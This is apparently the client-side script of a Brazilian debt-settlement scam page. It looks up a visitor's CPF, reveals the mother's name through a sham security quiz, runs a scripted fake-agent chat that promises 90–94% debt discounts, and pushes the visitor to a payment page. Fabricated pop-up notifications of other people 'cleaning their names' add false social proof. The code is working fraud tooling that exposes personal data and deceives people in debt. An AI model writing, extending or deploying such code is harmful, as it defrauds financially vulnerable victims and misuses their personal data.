document.addEventListener('DOMContentLoaded', () => {
    const cpfInput = document.getElementById('cpf');
    const btnConsultar = document.getElementById('btn-consultar');
    const sections = {
        cpf: document.getElementById('step-cpf'),
        loading: document.getElementById('step-loading'),
        security: document.getElementById('step-security'),
        chat: document.getElementById('step-chat')
    };

    let userData = null;
    const systemAvatar = "https://ui-avatars.com/api/?name=S&background=E63888&color=fff";

    // Mask CPF
    if (cpfInput) {
        cpfInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            
            e.target.value = value;
        });
    }

    // Handle Consultation
    if (btnConsultar) {
        btnConsultar.addEventListener('click', async () => {
            const cpf = cpfInput.value.replace(/\D/g, '');
            if (cpf.length !== 11) {
                alert('Por favor, insira um CPF válido.');
                return;
            }

            showSection('loading');

            try {
                const response = await fetch(`/api/consultar-cpf/${cpf}`);
                const data = await response.json();

                if (data.DADOS && data.DADOS.NOME_MAE) {
                    userData = data.DADOS;
                    localStorage.setItem('user_data', JSON.stringify(userData));
                    setTimeout(() => {
                        initSecurityStep(userData.NOME_MAE);
                    }, 2000);
                } else {
                    alert('CPF não encontrado ou erro na consulta. Tente novamente.');
                    showSection('cpf');
                }
            } catch (error) {
                console.error('Error fetching data:', error);
                alert('Erro ao conectar com o servidor. Tente novamente mais tarde.');
                showSection('cpf');
            }
        });
    }

    function showSection(id) {
        document.querySelectorAll('#app > section').forEach(section => {
            section.classList.remove('active');
        });
        
        const target = document.getElementById(`step-${id}`);
        if (target) {
            target.classList.add('active');
            window.scrollTo(0, 0);
        }
    }

    function initSecurityStep(realMotherName) {
        const container = document.getElementById('mother-options');
        if (!container) return;
        container.innerHTML = '';

        const names = generateFakeMotherNames(realMotherName);
        names.sort(() => Math.random() - 0.5);

        names.forEach(name => {
            const btn = document.createElement('button');
            btn.className = 'option-btn';
            btn.textContent = name;
            btn.onclick = () => {
                if (name === realMotherName) {
                    initChat();
                } else {
                    alert('Nome incorreto. Tente novamente para sua segurança.');
                }
            };
            container.appendChild(btn);
        });

        showSection('security');
    }

    function generateFakeMotherNames(realName) {
        const fakes = ["MARIA APARECIDA DOS SANTOS", "ANA PAULA OLIVEIRA SILVA", "TEREZA CRISTINA FERREIRA", "REGINA LUCIA SOUZA"];
        const list = [realName];
        let count = 0;
        while (list.length < 4 && count < fakes.length) {
            if (fakes[count] !== realName) list.push(fakes[count]);
            count++;
        }
        return list;
    }

    async function initChat() {
        showSection('chat');
        const chatContainer = document.getElementById('chat-messages');
        const actionsContainer = document.getElementById('chat-actions');
        
        const flow = [
            {
                id: 1,
                messages: [
                    `Olá, ${userData.NOME.split(' ')[0]}! Identificamos pendências vinculadas ao seu CPF que estão bloqueando seu acesso ao crédito.`,
                    "Para seguirmos com a sua proposta de quitação, informe qual o valor total aproximado das dívidas que você deseja regularizar hoje:"
                ],
                inputType: "number",
                placeholder: "Ex: 5000",
                nextId: 2
            },
            {
                id: 2,
                messages: [
                    "Processando acordos disponíveis...",
                    "Ótima notícia! Conseguimos uma liberação especial para o seu perfil.",
                    "Sua dívida total de {{ORIGINAL}} pode ser liquidada integralmente por apenas {{DISCOUNTED}}.",
                    "Deseja visualizar os detalhes do seu acordo e garantir sua certidão de NADA CONSTA agora?"
                ],
                actions: [{ text: "VER MINHA PROPOSTA AGORA", isAgreement: true }]
            },
            {
                id: 3,
                messages: [
                    "Excelente escolha! Acabamos de gerar sua proposta oficial com 94% de desconto.",
                    "Suas dívidas totais de R$ 5.234,90 podem ser quitadas hoje por apenas R$ 557,77.",
                    "Deseja visualizar os detalhes do seu acordo e limpar seu nome agora?"
                ],
                actions: [{ text: "VER MINHA PROPOSTA AGORA", nextId: 4 }]
            },
            {
                id: 4,
                messages: [
                    "Perfeito! Clique no botão abaixo para acessar sua área de pagamento seguro e garantir este desconto exclusivo antes que a oferta expire."
                ],
                actions: [{ text: "ACESSAR MEU ACORDO", isAgreement: true }]
            }
        ];

        async function runStep(stepId, customData = {}) {
            if (!actionsContainer) return;
            actionsContainer.innerHTML = '';
            const step = flow.find(s => s.id === stepId);
            if (!step) return;

            for (let text of step.messages) {
                if (customData.original) {
                    const discount = (customData.original * 0.1).toFixed(2);
                    text = text.replace('{{ORIGINAL}}', parseFloat(customData.original).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
                    text = text.replace('{{DISCOUNTED}}', parseFloat(discount).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
                    localStorage.setItem('debt_original', customData.original);
                    localStorage.setItem('debt_discounted', discount);
                }

                showTyping();
                await sleep(1500);
                removeTyping();
                addMessage('received', text);
            }

            if (step.inputType) {
                const inputWrapper = document.createElement('div');
                inputWrapper.className = 'chat-input-action';
                inputWrapper.innerHTML = `
                    <input type="number" id="step-input" placeholder="${step.placeholder}">
                    <button id="step-submit" class="btn-action">Enviar</button>
                `;
                actionsContainer.appendChild(inputWrapper);
                
                document.getElementById('step-submit').onclick = () => {
                    const val = document.getElementById('step-input').value;
                    if (!val || val <= 0) return alert('Por favor, insira um valor válido.');
                    addMessage('sent', `R$ ${val}`);
                    runStep(step.nextId, { original: val });
                };
            }

            if (step.actions) {
                step.actions.forEach(action => {
                    const btn = document.createElement('button');
                    btn.className = 'btn-action';
                    btn.textContent = action.text;
                    btn.onclick = () => {
                        addMessage('sent', action.text);
                        if (action.isAgreement) {
                            window.location.href = "acordo.html";
                        } else {
                            runStep(action.nextId);
                        }
                    };
                    actionsContainer.appendChild(btn);
                });
            }
        }

        runStep(1);
    }

    function addMessage(type, text) {
        const chatContainer = document.getElementById('chat-messages');
        if (!chatContainer) return;
        const wrapper = document.createElement('div');
        wrapper.className = `msg-wrapper ${type}`;
        
        const avatar = document.createElement('img');
        avatar.className = 'msg-avatar';
        avatar.src = type === 'received' ? systemAvatar : `https://ui-avatars.com/api/?name=${userData.NOME}&background=2D3277&color=fff`;
        
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `${text}<span class="time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>`;
        
        wrapper.appendChild(avatar);
        wrapper.appendChild(msgDiv);
        chatContainer.appendChild(wrapper);
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }

    function showTyping() {
        const chatContainer = document.getElementById('chat-messages');
        if (!chatContainer) return;
        const wrapper = document.createElement('div');
        wrapper.id = 'typing-indicator-wrapper';
        wrapper.className = 'msg-wrapper received';
        
        const avatar = document.createElement('img');
        avatar.className = 'msg-avatar';
        avatar.src = systemAvatar;
        
        const typingDiv = document.createElement('div');
        typingDiv.className = 'message received typing';
        typingDiv.innerHTML = '<span></span><span></span><span></span>';
        
        wrapper.appendChild(avatar);
        wrapper.appendChild(typingDiv);
        chatContainer.appendChild(wrapper);
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }

    function removeTyping() {
        const indicator = document.getElementById('typing-indicator-wrapper');
        if (indicator) indicator.remove();
    }

    // VSL Player Logic
    const vslContainer = document.getElementById('vsl-container');
    const vslMain = document.getElementById('vsl-main');
    const vslBg = document.getElementById('vsl-bg');
    const vslOverlay = document.getElementById('vsl-overlay');
    const vslProgress = document.getElementById('vsl-progress-bar');
    const vslRestart = document.getElementById('vsl-restart');

    if (vslContainer && vslMain) {
        const handlePlay = () => {
            console.log("VSL Play triggered");
            if (vslMain.paused) {
                // Ensure video is ready
                vslMain.muted = false; // Try with sound first
                const playPromise = vslMain.play();
                
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        console.log("Main video playing");
                        if (vslBg) vslBg.play().catch(() => {});
                        vslOverlay.classList.remove('active');
                    }).catch(error => {
                        console.warn("Play with sound failed, trying muted:", error);
                        vslMain.muted = true;
                        vslMain.play().then(() => {
                            vslOverlay.classList.remove('active');
                            // Add a "click to unmute" button if needed
                            console.log("Main video playing muted");
                        });
                    });
                }
            } else {
                vslMain.pause();
                if (vslBg) vslBg.pause();
                vslOverlay.classList.add('active');
            }
        };

        // Add listener to both container and overlay to be sure
        vslContainer.addEventListener('click', handlePlay);
        if (vslOverlay) vslOverlay.addEventListener('click', (e) => {
            e.stopPropagation();
            handlePlay();
        });

        vslMain.addEventListener('timeupdate', () => {
            if (vslProgress) {
                const percentage = (vslMain.currentTime / vslMain.duration) * 100;
                vslProgress.style.width = percentage + '%';
            }
            
            // Sync background if it drifts
            if (vslBg && Math.abs(vslMain.currentTime - vslBg.currentTime) > 0.5) {
                vslBg.currentTime = vslMain.currentTime;
            }
        });

        if (vslRestart) {
            vslRestart.addEventListener('click', (e) => {
                e.stopPropagation();
                vslMain.currentTime = 0;
                if (vslBg) vslBg.currentTime = 0;
                vslMain.play();
                if (vslBg) vslBg.play();
                vslOverlay.classList.remove('active');
            });
        }

        vslMain.addEventListener('ended', () => {
            showSection('cpf');
            if (vslBg) vslBg.pause();
            startNotifications();
        });

        function startNotifications() {
            const container = document.getElementById('notification-container');
            if (!container) return;
            const names = ['João', 'Maria', 'Carlos', 'Ana', 'Pedro', 'Julia', 'Marcos', 'Fernanda', 'Ricardo', 'Beatriz'];
            const surnames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira'];
            
            function createNotify() {
                const name = names[Math.floor(Math.random() * names.length)];
                const surname = surnames[Math.floor(Math.random() * surnames.length)];
                const cpfMask = `${Math.floor(Math.random() * 900 + 100)}.***.***-${Math.floor(Math.random() * 90 + 10)}`;
                const limit = (Math.random() * 5000 + 1000).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
                
                const div = document.createElement('div');
                div.className = 'notification';
                div.innerHTML = `
                    <div class="notify-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg></div>
                    <div class="notify-content">
                        <p><strong>${name} ${surname}</strong> (${cpfMask})</p>
                        <p>Limpou o nome agora e liberou <strong>${limit}</strong> de crédito!</p>
                    </div>
                `;
                
                container.appendChild(div);
                setTimeout(() => div.remove(), 5000);
            }

            setTimeout(createNotify, 3000);
            setInterval(createNotify, Math.random() * 7000 + 10000);
        }
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    // Particles Background System
    function initParticles() {
        const container = document.getElementById('particles-js');
        if (!container) return;

        const canvas = document.createElement('canvas');
        container.appendChild(canvas);
        const ctx = canvas.getContext('2d');

        let particles = [];
        const particleCount = 60;
        const connectionDistance = 150;

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }

        window.addEventListener('resize', resize);
        resize();

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.5;
                this.vy = (Math.random() - 0.5) * 0.5;
                this.size = 2;
            }

            update() {
                this.x += this.vx;
                this.y += this.vy;

                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
            }

            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
                ctx.fill();
            }
        }

        for (let i = 0; i < particleCount; i++) {
            particles.push(new Particle());
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            for (let i = 0; i < particles.length; i++) {
                const p1 = particles[i];
                p1.update();
                p1.draw();

                for (let j = i + 1; j < particles.length; j++) {
                    const p2 = particles[j];
                    const dx = p1.x - p2.x;
                    const dy = p1.y - p2.y;
                    const dist = Math.sqrt(dx * dx + dy * dy);

                    if (dist < connectionDistance) {
                        ctx.beginPath();
                        ctx.strokeStyle = `rgba(0, 0, 0, ${0.1 * (1 - dist / connectionDistance)})`;
                        ctx.lineWidth = 1;
                        ctx.moveTo(p1.x, p1.y);
                        ctx.lineTo(p2.x, p2.y);
                        ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animate);
        }

        animate();
    }

    initParticles();
});